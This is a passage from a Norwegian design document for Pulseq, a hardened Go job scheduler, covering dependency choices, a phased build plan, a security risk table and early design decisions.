| Egen cron-parser (~200 LOC) | `robfig/cron/v3` | Vi trenger kun parsing + `next(t)`, med *våre* iterasjonsgrenser. En dep for 200 linjer er dårlig bytte i akkurat dette systemet. Revurderes hvis kalenderregler blir komplekse |
| Stdlib `flag` + egen dispatch | `cobra`, `urfave/cli` | Cobra drar inn et betydelig tre for en CLI-flate vi kontrollerer helt. Holder dep-budsjettet |
| `github.com/landlock-lsm/go-landlock` | egen syscall-wrapping | Riktig ABI-håndtering er lett å gjøre feil. Liten, fokusert, vedlikeholdt. Kun i `pulseq-shim` |
| `filippo.io/age` | SOPS, egen AES-GCM | Liten, revidert, ingen konfigvalg å gjøre feil. Aldri egen kryptoprimitiv |
| `systemd-run --scope` for cgroup+uid | egen cgroupfs-kode | Null privilegert kode å skrive der systemd finnes. Direkte cgroupfs som fallback |
| `html/template`, server-rendret | React/SPA | Ingen byggekjede, ingen npm-supply-chain, kontekstsensitiv escaping innebygd, streng CSP mulig |
| Ingen ORM | GORM, ent | Håndskrevet SQL er lesbart, granskbart og gir eksakt kontroll over transaksjonsmodus (`BEGIN IMMEDIATE`) |
| Postgres som opsjon | — | Utsatt bevisst til fase 6: multi-node endrer tillitsmodellen (nettverk mellom komponenter) og fortjener egen designrunde |

---

## 9. Faseinndeling

### Fase 0 — Fundament (uke 1)
Tomt repo → `main` med sikkerhetsgrunnmur på plass **før** første funksjonelle kode.
- `go.mod`, katalogstruktur (`cmd/`, `internal/`), `Makefile`.
- CI: build, `go test -race`, `go vet`, `staticcheck`, `gosec`, `govulncheck`, CodeQL, gofumpt.
- `SECURITY.md` (trusselmodell + eksplisitte ikke-mål), `docs/adr/0001-…`, `docs/threat-model.md`.
- Beslutning: dep-budsjett og ADR-krav for nye deps.
- **Exit:** CI grønn, tomt program starter, sikkerhetsdokumenter finnes.

### Fase 1 — Kjerne (uke 2–4)
- SQLite-skjema + migrasjoner + single-writer/read-pool-mønsteret.
- State machine for run/step, med tabelldrevne tester på alle overganger.
- TOML-spec-parser + validator (syklus, argv-regler, grenser). Fuzz fra dag 1.
- `pulseq-exec`-fri `same-user` exec: argv, tom env-baseline, per-run workdir, pipe → loggfil,
  obligatorisk timeout, cgroup-opprettelse + `cgroup.kill`.
- Unix socket + `SO_PEERCRED` + roller. CLI: `run`, `status`, `runs`, `logs`, `explain`.
- Audit-tabell med hash-kjede + journald-speiling. `pulseq verify-audit`.
- `file:`-secret-backend, tmpfs-levering, redaksjons-matcher.
- **Exit:** man kan definere en jobb i en fil, kjøre den, se loggen, og revidere hva som skjedde.
  Ingen nettverksflate finnes ennå.

### Fase 2 — Triggere (uke 5–7)
- Cron/interval-schedules, timezone, DST-tester, preview, pause/resume, catch-up med tak,
  concurrency-limits.
- Sensors: `check(ctx) -> [trigger] | skip_reason`, cursor-persistens, `run_key`-idempotens,
  fan-out-tak. Innebygde: fil/katalog, HTTP-poll (med SSRF-vern), SQL-poll.
- Leases + fencing, reconciliation ved oppstart.
- DAG-utføring: topologisk, parallell, retry per steg, replay mot samme `job_version`.
- **Exit:** MVP-listen fra prosjektbeskrivelsen er dekket.

### Fase 3 — Herding (uke 8–10)
- `pulseq-exec`: privilegert helper, eksplisitt protokoll (fuzzet), exec-user-allowlist,
  `systemd-run --scope`-integrasjon, per-jobb uid/gid.
- `pulseq-shim`: Landlock, `NoNewPrivileges`, rlimits, privat `/tmp`.
- Sandkasse-nivåer `none|basic|strict|besteffort` med hard feiling i `strict`.
- `age:` og `systemd-creds:` secret-backends.
- `pulseq doctor`.
- Hardened systemd-unit (`ProtectSystem=strict`, `ProtectHome`, `PrivateDevices`,
  `SystemCallFilter=@system-service`, `NoNewPrivileges`, `Delegate=yes` for `pulseq.slice`).
- **Exit:** en jobb kan kjøres som dedikert bruker, med minne-/CPU-/pid-tak og filsystemrestriksjoner,
  og systemet rapporterer nøyaktig hvilke vern som er aktive.

### Fase 4 — Nettverksflate (uke 11–14)
- HTTPS-API bak feature flag, default `127.0.0.1`, bearer-tokens (SHA-256 + prefiks), rolle + utløp.
- Webhook-lytter: HMAC-SHA256 med timestamp i digest, replay-cache, rate limit, body-tak.
- Web-UI: server-rendret, read-only først, streng CSP, deretter mutasjoner med CSRF.
- Prometheus-metrics på egen lokal adresse.
- **Ekstern sikkerhetsgjennomgang / pentest før dette merges til stabil.** Dette er punktet der
  tillitsmodellen faktisk endres.
- **Exit:** eksponert flate finnes, med auth, og er gransket.

### Fase 5 — Utgivelse og modenhet (uke 15–17)
- GoReleaser, cosign keyless, Rekor, CycloneDX-SBOM, SLSA-provenance, reproduserbar-bygg-verifisering.
- Signerte jobbspecs (`allowed_signers`), signert audit-anker (Ed25519 via systemd credential).
- `exec:`-secret-backend (Vault/AWS SM/1Password).
- Backfill, notifikasjoner (med redaksjon i varselinnhold!), artifact lineage, dry-run/explain-plan.
- Retensjon og GDPR-tenkning på logger/payloads.
- **Exit:** 1.0. Signerte binærer, SBOM, dokumentert trusselmodell.

### Fase 6 — Multi-node (utsatt, egen designrunde)
Postgres-backend, agent/kontrollplan over nettverk. Dette **innfører nye tillitsgrenser** (kontrollplan
↔ agent) og krever mTLS, agent-registrering, og en revisjon av hele trusselmodellen. Skal ikke smugles
inn som «bare et annet DB-driver-valg».

---

## 10. Risikoer

| # | Risiko | Konsekvens | Motmiddel |
|---|---|---|---|
| R1 | **Sikkerhetsteater**: redaksjon og «sandbox»-flagg gir falsk trygghet | Brukere kjører ubetrodd kode i `basic` og tror de er beskyttet | Eksplisitte ikke-mål i `SECURITY.md`; `strict` feiler i stedet for å degradere; `pulseq doctor` viser reell status |
| R2 | **Privilegert helper blir stor** | `pulseq-exec` blir den nye angrepsflaten | Hard LOC-grense i CI, null deps, fuzzet protokoll, egen review-policy for den katalogen |
| R3 | **Brukervennlighetsfriksjon** → `shell = true` overalt | Argv-designet blir omgått i praksis | Gjør argv-formen hyggelig (god feilmelding ved strengform, `pulseq lint` foreslår splitting); `allow_shell = false` som anbefalt prod-default |
| R4 | **Best-effort-degradering slår stille av vern** | Falsk trygghet ved kernel-oppgradering/nedgradering | `besteffort` er eget, eksplisitt nivå; degraderinger skrives til run-metadata og audit |
| R5 | **systemd-avhengighet** for cgroup/uid/credentials | Redusert portabilitet (containere, ikke-systemd) | Direkte cgroupfs-fallback; systemd-avhengige funksjoner er opt-in, ikke krav |
| R6 | **SQLite-skriveflaskehals** ved høyfrekvent sensor-polling | Tick-forsinkelser, `SQLITE_BUSY` | Logger/payloads ut av DB, batchede cursor-oppdateringer, `BEGIN IMMEDIATE`, målt throughput-budsjett; Postgres-vei finnes |
| R7 | **Klokkeskrue / DST / timezone** | Dupliserte eller uteblitte runs | Alt i UTC, `run_key` inkluderer logisk tick, eksplisitte DST-tester, monotont ur for varighet |
| R8 | **Log-bomb / disk-fylling** | DoS av verten, og av andre jobber | Per-steg- og per-run-cap, linjerate-cap, retensjon, egen filsystemkvote anbefalt for `/var/lib/pulseq` |
| R9 | **Egen release-pipeline kompromitteres** | Signerte, ondsinnede binærer | Keyless signering med transparenslogg (Rekor gir offentlig oppdagbarhet), SLSA-provenance, reproduserbart bygg som lar tredjepart verifisere |
| R10 | **Scope creep mot «Dagster i Go»** | Stor SDK-flate = stor angrepsflate; motsier hele produktideen | Eksplisitt ikke-mål-liste i README; ny funksjonalitet må passere «øker dette antall måter kode kan komme inn på?» |
| R11 | **Secrets i minne** hos `pulseqd` | Core dump / minnedump lekker | `[]byte` som nulles, `RLIMIT_CORE=0` på både daemon og jobber, `ProtectKernelTunables`, ingen swap anbefalt (eller `mlock` for secret-buffere) |
| R12 | **Multi-tenant forventning** oppstår hos brukere | Folk deler én Pulseq mellom team med ulik tillit | Dokumentert som ikke-mål; per-jobb-bruker gir *noe*, men anbefalingen er én instans per tillitssone |

---

## 11. Beslutninger som må tas tidlig

1. **Er `file`-modus (GitOps) default, eller `db`-modus?** Anbefaling: `file` som default, `db` som
   opt-in. Dette avgjør om API-et i det hele tatt trenger et skrive-endepunkt for spec.
2. **Droppes templating helt i MVP?** Anbefaling: ja — kontekst leveres kun som miljøvariabler.
   Templating er den enkleste veien til injeksjon og kan legges til med bedre design senere.
3. **TOML eller YAML?** Anbefaling: TOML, YAML som opt-in i strict-mode senere.
4. **Egen cron-parser eller `robfig/cron`?** Anbefaling: egen, ~200 LOC, med våre grenser og fuzz-tester.
5. **Fjerner vi `shell = true` helt?** Anbefaling: behold, men med `allow_shell = false` som anbefalt
   prod-konfig og synlig markering i UI/CLI.

---

## Oppsummering i én setning

Pulseq bygges innenfra og ut: først en kjerne uten nettverksflate der jobben er et argv-array som kjøres
med timeout i en cgroup som en uprivilegert bruker og logges revisjonsbart — og først når den kjernen er
riktig, legges det på identitet, sandkasse og eksponerte flater, ett lag av gangen, hver med sin egen
gjennomgang.
